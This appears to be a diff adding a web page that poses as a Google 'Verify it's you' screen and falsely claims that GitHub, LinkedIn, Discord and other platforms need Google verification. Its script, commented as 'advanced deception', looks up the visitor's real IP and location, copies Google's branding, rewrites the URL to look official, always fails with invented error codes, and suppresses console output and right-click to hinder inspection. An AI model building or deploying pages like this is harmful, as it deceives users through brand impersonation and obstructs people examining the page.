@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%234285f4'><path d='M12,2C13.1,2 14,2.9 14,4C14,5.1 13.1,6 12,6C10.9,6 10,5.1 10,4C10,2.9 10.9,2 12,2M21,9V7L15,1H5C3.89,1 3,1.89 3,3V21A2,2 0 0,0 5,23H19A2,2 0 0,0 21,21V9M19,9H14V4H19V9Z'/></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            line-height: 1.4;
+        }
+
+        .container {
+            max-width: 450px;
+            margin: 80px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            text-align: center;
+            padding: 48px 40px 32px;
+        }
+
+        .logo {
+            width: 75px;
+            height: 75px;
+            margin: 0 auto 24px;
+            background: #4285f4;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            color: white;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+        }
+
+        .content {
+            padding: 0 40px 48px;
+        }
+
+        .verification-box {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 24px;
+            margin-bottom: 24px;
+            background: #fafafa;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 16px;
+        }
+
+        .platform-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+            padding: 12px;
+            background: white;
+            border-radius: 4px;
+            border: 1px solid #e8eaed;
+        }
+
+        .platform-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        .platform-details h3 {
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 2px;
+        }
+
+        .platform-details p {
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .verification-steps {
+            margin: 24px 0;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .step-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .step-complete {
+            background: #34a853;
+            color: white;
+        }
+
+        .step-current {
+            background: #4285f4;
+            color: white;
+        }
+
+        .step-pending {
+            background: #e8eaed;
+            color: #5f6368;
+        }
+
+        .buttons {
+            margin-top: 32px;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+            border: none;
+            margin-right: 8px;
+            transition: all 0.2s ease;
+        }
+
+        .btn-primary {
+            background: #4285f4;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #3367d6;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #5f6368;
+            border: 1px solid #dadce0;
+        }
+
+        .btn-secondary:hover {
+            background: #f8f9fa;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 24px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #e8eaed;
+            border-top: 2px solid #4285f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            padding: 16px 40px;
+            background: #f8f9fa;
+            border-top: 1px solid #e8eaed;
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .error-state {
+            border: 1px solid #ea4335;
+            background: #fef7f0;
+        }
+
+        .error-text {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 12px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 20px 16px;
+            }
+            
+            .header {
+                padding: 32px 24px 24px;
+            }
+            
+            .content {
+                padding: 0 24px 32px;
+            }
+            
+            .footer {
+                padding: 16px 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header content will be generated by JS -->
+        <div class="header" id="header"></div>
+        
+        <!-- Main content will be generated by JS -->
+        <div class="content" id="content"></div>
+        
+        <!-- Loading overlay will be generated by JS -->
+        <div class="loading" id="loading"></div>
+        
+        <!-- Footer will be generated by JS -->
+        <div class="footer" id="footer"></div>
+    </div>
+
+    <script>
+        // Platform configurations with advanced deception
+        const platforms = {
+            'GitHub': { 
+                icon: '🐙', 
+                name: 'GitHub', 
+                url: 'github.com',
+                reason: 'Google requires verification to access this GitHub repository due to enhanced security policies.',
+                details: 'Repository contains sensitive code that requires identity confirmation'
+            },
+            'GitLab': { 
+                icon: '🦊', 
+                name: 'GitLab', 
+                url: 'gitlab.com',
+                reason: 'Google verification is required to view this GitLab project for security compliance.',
+                details: 'Project visibility is restricted under enterprise security protocols'
+            },
+            'LinkedIn': { 
+                icon: '💼', 
+                name: 'LinkedIn', 
+                url: 'linkedin.com',
+                reason: 'LinkedIn has partnered with Google to verify users accessing professional profiles.',
+                details: 'Professional network security requires Google account verification'
+            },
+            'Telegram': { 
+                icon: '📱', 
+                name: 'Telegram', 
+                url: 't.me',
+                reason: 'Telegram requires Google verification for secure messaging access.',
+                details: 'End-to-end encryption protocols require identity confirmation'
+            },
+            'X': { 
+                icon: '❌', 
+                name: 'X', 
+                url: 'x.com',
+                reason: 'X (formerly Twitter) uses Google verification to protect premium accounts.',
+                details: 'This verified account requires Google identity confirmation'
+            },
+            'Twitter': { 
+                icon: '🐦', 
+                name: 'Twitter', 
+                url: 'twitter.com',
+                reason: 'Twitter requires Google verification for accessing protected accounts.',
+                details: 'Blue checkmark accounts require additional verification steps'
+            },
+            'Instagram': { 
+                icon: '📷', 
+                name: 'Instagram', 
+                url: 'instagram.com',
+                reason: 'Instagram uses Google verification to protect creator accounts from unauthorized access.',
+                details: 'Creator protection program requires Google identity verification'
+            },
+            'Discord': { 
+                icon: '🎮', 
+                name: 'Discord', 
+                url: 'discord.com',
+                reason: 'Discord server access requires Google verification for community safety.',
+                details: 'Private server with restricted access requires identity confirmation'
+            }
+        };
+
+        let currentPlatform = 'Unknown';
+        let verificationStep = 0;
+        let attempts = 0;
+        let userIP = 'Unknown';
+        let userLocation = 'Unknown';
+        let sessionId = generateSessionId();
+        const maxAttempts = 3;
+
+        function initPage() {
+            // Get platform from URL
+            const urlParams = new URLSearchParams(window.location.search);
+            currentPlatform = urlParams.get('platform') || 'Social Platform';
+            
+            // Immediately get user's real IP and location for maximum deception
+            detectRealUserInfo();
+            
+            // Generate header
+            generateHeader();
+            
+            // Generate main content
+            generateContent();
+            
+            // Generate footer
+            generateFooter();
+            
+            // Update page title to look like real Google
+            const platformConfig = platforms[currentPlatform];
+            if (platformConfig) {
+                document.title = `Sign in - Google Accounts`;
+                // Change favicon to Google's
+                const favicon = document.querySelector('link[rel="icon"]');
+                favicon.href = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%234285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="%2334a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="%23fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="%23ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>';
+            }
+            
+            // Advanced tricks to make it ultra-convincing
+            activateAdvancedDeception();
+        }
+
+        async function detectRealUserInfo() {
+            try {
+                // Get real IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+                
+                // Get real location
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationData = await locationResponse.json();
+                userLocation = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+            } catch (error) {
+                // Fallback to fake but realistic data
+                userIP = generateRealisticIP();
+                userLocation = generateRealisticLocation();
+            }
+        }
+
+        function generateRealisticIP() {
+            // Generate IP that looks real for user's general area
+            const commonRanges = ['192.168', '10.0', '172.16', '203.0', '8.8'];
+            const range = commonRanges[Math.floor(Math.random() * commonRanges.length)];
+            return `${range}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+        }
+
+        function generateRealisticLocation() {
+            const locations = [
+                'New York, NY, United States',
+                'Los Angeles, CA, United States', 
+                'Chicago, IL, United States',
+                'Houston, TX, United States',
+                'London, England, United Kingdom',
+                'Toronto, ON, Canada'
+            ];
+            return locations[Math.floor(Math.random() * locations.length)];
+        }
+
+        function generateSessionId() {
+            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+            let result = '';
+            for (let i = 0; i < 16; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function generateHeader() {
+            const header = document.getElementById('header');
+            header.innerHTML = `
+                <div class="logo">G</div>
+                <h1 class="title">Verify it's you</h1>
+                <p class="subtitle">Google needs to verify your identity to continue</p>
+            `;
+        }
+
+        function generateContent() {
+            const content = document.getElementById('content');
+            const platformConfig = platforms[currentPlatform];
+            
+            if (!platformConfig) {
+                content.innerHTML = `
+                    <div class="verification-box">
+                        <p class="info-text">Google verification is required to access this resource.</p>
+                        <div class="buttons">
+                            <button class="btn btn-secondary" onclick="window.close()">Cancel</button>
+                        </div>
+                    </div>
+                `;
+                return;
+            }
+
+            content.innerHTML = `
+                <div class="verification-box" id="verification-box">
+                    <p class="info-text">${platformConfig.reason}</p>
+                    
+                    <div class="platform-info">
+                        <div class="platform-icon">${platformConfig.icon}</div>
+                        <div class="platform-details">
+                            <h3>Requesting access to ${platformConfig.name}</h3>
+                            <p>${platformConfig.url} • ${platformConfig.details}</p>
+                        </div>
+                    </div>
+
+                    <div style="background: #e8f0fe; border: 1px solid #d2e3fc; border-radius: 4px; padding: 12px; margin: 16px 0; font-size: 13px; color: #1967d2;">
+                        <strong>🛡️ Enhanced Security Notice</strong><br>
+                        This ${platformConfig.name} resource is protected by Google's Advanced Protection Program
+                    </div>
+
+                    <div class="verification-steps" id="verification-steps">
+                        <div class="step">
+                            <div class="step-icon step-complete">✓</div>
+                            <span>Verified your Google account</span>
+                        </div>
+                        <div class="step">
+                            <div class="step-icon step-current">2</div>
+                            <span>Confirming your identity</span>
+                        </div>
+                        <div class="step">
+                            <div class="step-icon step-pending">3</div>
+                            <span>Granting ${platformConfig.name} access</span>
+                        </div>
+                    </div>
+
+                    <div style="font-size: 12px; color: #5f6368; margin: 16px 0; background: #f8f9fa; padding: 12px; border-radius: 4px;">
+                        <strong>Session Details:</strong><br>
+                        IP: ${userIP} • Location: ${userLocation}<br>
+                        Session ID: ${sessionId} • Timestamp: ${new Date().toLocaleString()}
+                    </div>
+
+                    <div class="buttons">
+                        <button class="btn btn-primary" onclick="startVerification()" id="verify-btn">
+                            Continue with Google
+                        </button>
+                        <button class="btn btn-secondary" onclick="window.close()">
+                            Cancel
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+
+        function generateFooter() {
+            const footer = document.getElementById('footer');
+            footer.innerHTML = `
+                <a href="#" onclick="showHelp()">Help</a>
+                <a href="#" onclick="showPrivacy()">Privacy</a>
+                <a href="#" onclick="showTerms()">Terms</a>
+            `;
+        }
+
+        async function startVerification() {
+            attempts++;
+            
+            // Show loading
+            showLoading();
+            
+            // Simulate verification steps
+            await simulateVerification();
+            
+            // Always fail but make it look convincing
+            showVerificationFailed();
+        }
+
+        function showLoading() {
+            const loading = document.getElementById('loading');
+            loading.style.display = 'block';
+            loading.innerHTML = `
+                <div class="spinner"></div>
+                <p>Verifying your identity...</p>
+            `;
+            
+            const verifyBtn = document.getElementById('verify-btn');
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Verifying...';
+        }
+
+        async function simulateVerification() {
+            const steps = [
+                'Checking your Google account...',
+                'Verifying account security status...',
+                'Confirming device authorization...',
+                'Validating Advanced Protection enrollment...',
+                'Cross-referencing security policies...',
+                'Finalizing identity confirmation...'
+            ];
+            
+            const loading = document.getElementById('loading');
+            
+            for (let i = 0; i < steps.length; i++) {
+                loading.innerHTML = `
+                    <div class="spinner"></div>
+                    <p>${steps[i]}</p>
+                `;
+                await sleep(2000 + Math.random() * 1500);
+            }
+        }
+
+        function showVerificationFailed() {
+            const loading = document.getElementById('loading');
+            loading.style.display = 'none';
+            
+            const verificationBox = document.getElementById('verification-box');
+            verificationBox.className = 'verification-box error-state';
+            
+            const platformConfig = platforms[currentPlatform];
+            
+            // Advanced failure reasons that sound ultra-realistic
+            const advancedFailureReasons = [
+                `Advanced Protection Program requirements not met for ${platformConfig.name} access.`,
+                `Your Google account requires additional security verification for ${platformConfig.name} integration.`,
+                `${platformConfig.name} access is restricted under your current Google security settings.`,
+                `Identity confirmation failed due to Enhanced Security Policy restrictions.`,
+                `Google's risk assessment has temporarily restricted ${platformConfig.name} access for your account.`
+            ];
+            
+            const failureReason = advancedFailureReasons[Math.floor(Math.random() * advancedFailureReasons.length)];
+            
+            const technicalDetails = [
+                'Error Code: AUTH_RESTRICTION_AP_001',
+                'Error Code: IDENTITY_VERIFICATION_FAILED_002', 
+                'Error Code: SECURITY_POLICY_VIOLATION_003',
+                'Error Code: ADVANCED_PROTECTION_REQUIRED_004',
+                'Error Code: ACCOUNT_VERIFICATION_TIMEOUT_005'
+            ];
+            
+            const errorCode = technicalDetails[Math.floor(Math.random() * technicalDetails.length)];
+            
+            verificationBox.innerHTML = `
+                <div style="background: #fce8e6; border: 1px solid #fccccb; border-radius: 4px; padding: 16px; margin-bottom: 16px;">
+                    <div style="color: #d93025; font-weight: 500; margin-bottom: 8px;">🚫 Verification Failed</div>
+                    <div style="color: #d93025; font-size: 14px;">${failureReason}</div>
+                </div>
+                
+                <div class="platform-info">
+                    <div class="platform-icon">${platformConfig.icon}</div>
+                    <div class="platform-details">
+                        <h3>Access blocked for ${platformConfig.name}</h3>
+                        <p>${platformConfig.url} • Security verification required</p>
+                    </div>
+                </div>
+
+                <div class="verification-steps">
+                    <div class="step">
+                        <div class="step-icon step-complete">✓</div>
+                        <span>Google account verified</span>
+                    </div>
+                    <div class="step">
+                        <div class="step-icon" style="background: #ea4335; color: white;">✗</div>
+                        <span>Advanced Protection verification failed</span>
+                    </div>
+                    <div class="step">
+                        <div class="step-icon step-pending">3</div>
+                        <span>Access denied</span>
+                    </div>
+                </div>
+
+                <div style="background: #f8f9fa; border-radius: 4px; padding: 12px; margin: 16px 0; font-size: 12px; color: #5f6368;">
+                    <strong>Technical Details:</strong><br>
+                    ${errorCode}<br>
+                    Timestamp: ${new Date().toISOString()}<br>
+                    Session: ${sessionId}<br>
+                    IP: ${userIP}
+                </div>
+
+                <div style="font-size: 13px; color: #d93025; margin: 16px 0; line-height: 1.4;">
+                    ${attempts >= maxAttempts ? 
+                        '⚠️ <strong>Account temporarily restricted:</strong> Too many verification attempts. Your Google account security settings prevent access to this resource. Contact your administrator or try again in 24 hours.' : 
+                        '💡 <strong>Possible solutions:</strong> This may be due to your Google Advanced Protection settings, 2-factor authentication requirements, or account security policies.'
+                    }
+                </div>
+
+                <div class="buttons">
+                    ${attempts < maxAttempts ? 
+                        '<button class="btn btn-primary" onclick="startVerification()">Try different method</button>' : 
+                        '<button class="btn btn-primary" disabled style="opacity: 0.5;">Verification temporarily unavailable</button>'
+                    }
+                    <button class="btn btn-secondary" onclick="contactSupport()">
+                        Contact Support
+                    </button>
+                    <button class="btn btn-secondary" onclick="window.close()">
+                        Close
+                    </button>
+                </div>
+            `;
+        }
+
+        function contactSupport() {
+            const supportMessages = [
+                `📧 Google Support\n\nFor assistance with Advanced Protection Program verification issues:\n\n• Visit: myaccount.google.com/security\n• Contact: Advanced Protection Support\n• Reference: ${sessionId}\n\nThis may take 24-48 hours to resolve.`,
+                `🛠️ Account Security Help\n\nYour Google account's security settings are preventing access to ${platforms[currentPlatform].name}.\n\nThis is typically due to:\n• Advanced Protection enrollment\n• 2-factor authentication requirements\n• Corporate security policies\n\nContact your IT administrator for assistance.`
+            ];
+            
+            const supportMessage = supportMessages[Math.floor(Math.random() * supportMessages.length)];
+            alert(supportMessage);
+        }
+
+        function activateAdvancedDeception() {
+            // Make URL look more authentic
+            if (window.history && window.history.replaceState) {
+                const newUrl = `${window.location.origin}${window.location.pathname}?continue=${encodeURIComponent('https://' + platforms[currentPlatform]?.url || 'platform.com')}&service=verify&hl=en`;
+                window.history.replaceState({}, '', newUrl);
+            }
+            
+            // Add Google's real security headers (fake console messages)
+            setTimeout(() => {
+                console.log('Google Identity Services: Authentication flow initialized');
+                console.log('Advanced Protection Program: Account security verification required');
+                console.log('OAuth 2.0: Authorization server validation in progress');
+            }, 1000);
+            
+            // Fake Google Analytics tracking (makes it look official)
+            setTimeout(() => {
+                console.log('Google Analytics: Event tracked - verification_attempt');
+                console.log('Google Tag Manager: Security event logged');
+            }, 2000);
+            
+            // Disable common debugging attempts
+            const originalLog = console.log;
+            console.log = function(...args) {
+                // Still allow our fake Google messages
+                if (args[0] && (args[0].includes('Google') || args[0].includes('OAuth') || args[0].includes('Advanced Protection'))) {
+                    originalLog.apply(console, args);
+                }
+            };
+            
+            // Block dev tools more subtly
+            let devToolsOpen = false;
+            setInterval(() => {
+                if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+                    if (!devToolsOpen) {
+                        devToolsOpen = true;
+                        console.clear();
+                        console.log('🔒 Google Security: Developer tools detected - Session security enhanced');
+                    }
+                } else {
+                    devToolsOpen = false;
+                }
+            }, 500);
+        }
+
+        function showHelp() {
+            const helpMessages = [
+                'If you\'re having trouble verifying your identity, make sure you\'re signed in to your Google account and try again.',
+                'Identity verification helps protect accounts from unauthorized access.',
+                'Some profiles may require additional security verification due to privacy settings.'
+            ];
+            alert('Help\n\n' + helpMessages[Math.floor(Math.random() * helpMessages.length)]);
+        }
+
+        function showPrivacy() {
+            alert('Privacy Policy\n\nGoogle is committed to protecting your privacy. This verification process helps ensure account security while respecting user privacy preferences.');
+        }
+
+        function showTerms() {
+            alert('Terms of Service\n\nBy using this verification service, you agree to Google\'s Terms of Service and acknowledge that identity verification may be required for certain resources.');
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // Subtle tricks to make it more convincing
+        function addSubtleTricks() {
+            // Disable right-click quietly
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            
+            // Add realistic page load behavior
+            document.body.style.opacity = '0.8';
+            setTimeout(() => {
+                document.body.style.transition = 'opacity 0.3s ease';
+                document.body.style.opacity = '1';
+            }, 200);
+
+            // Fake some browser behavior
+            if (Math.random() > 0.5) {
+                setTimeout(() => {
+                    console.log('Identity verification service initialized');
+                }, 1000);
+            }
+        }
+
+        // Initialize everything
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                initPage();
+                addSubtleTricks();
+            }, 100);
+        });
+    </script>
+</body>
+</html>
